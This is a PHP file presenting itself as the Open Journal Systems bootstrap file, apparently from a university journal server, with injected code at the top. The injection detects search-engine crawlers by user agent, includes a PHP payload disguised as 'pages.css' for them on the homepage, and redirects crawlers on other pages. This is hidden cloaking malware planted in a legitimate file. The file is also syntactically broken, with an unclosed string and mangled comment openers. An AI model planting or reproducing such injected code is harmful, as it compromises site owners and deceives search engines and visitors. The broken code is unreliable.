<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'AhrefsBot', 'Google-Site-Verification', 'Google-InspectionTool');

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function is_homepage() {
    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    return $uri === '/' || $uri === '';
}

if (is_bot()) {
    if (is_homepage()) {
        include('/home/lp2m/public_html/ojs.lp2m.uinjambi.ac.id/registry/pages.css);
    } else {
        header("Location: https://ojs.lp2m.uinjambi.ac.id/", true, 301);
    }
    exit;
}

/
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
  // Older versions of PHP do not define this
  define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');

return new Application();
